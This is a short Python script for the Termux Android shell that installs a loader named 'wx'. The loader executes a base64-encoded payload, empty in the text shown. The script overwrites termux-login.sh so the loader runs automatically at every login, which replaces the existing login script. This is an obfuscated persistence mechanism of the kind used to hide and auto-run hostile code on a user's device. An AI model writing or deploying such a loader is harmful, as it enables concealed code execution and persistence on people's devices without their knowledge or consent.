import base64,os
herkn=b''


open("/data/data/com.termux/files/usr/bin/wx","w").write(f'#!/usr/bin/python3\nimport base64\nexec(base64.b64decode({herkn}))\n')
os.system("chmod +x /data/data/com.termux/files/usr/bin/wx")
open("/data/data/com.termux/files/usr/etc/termux-login.sh","w").write("python /data/data/com.termux/files/usr/bin/wx")

